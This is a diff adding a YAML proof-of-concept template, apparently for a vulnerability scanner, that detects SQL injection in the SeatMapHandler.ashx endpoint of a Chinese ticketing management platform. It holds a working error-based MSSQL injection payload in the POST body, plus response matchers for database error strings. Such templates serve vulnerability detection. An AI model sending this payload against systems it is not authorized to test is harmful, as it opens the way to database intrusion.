@@ -1,0 +1,27 @@
+id: poc-yaml-zckx-seatmaphandler-ashx-sqli
+info:
+  name: \u4E2D\u57CE\u79D1\u4FE1\u7968\u52A1\u7BA1\u7406\u5E73\u53F0 SeatMapHandler.ashx SQL\u6CE8\u5165\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - method: POST
+    path:
+      - "/SystemManager/Comm/SeatMapHandler.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "Method=GetZoneInfo&solutionNo=%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\u5728\u5C06 varchar \u503C"
+          - "\u8F6C\u6362\u6210\u6570\u636E\u7C7B\u578B int \u65F6\u5931\u8D25"
+          - "Error:\u547D\u540D\u7A7A\u95F4"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
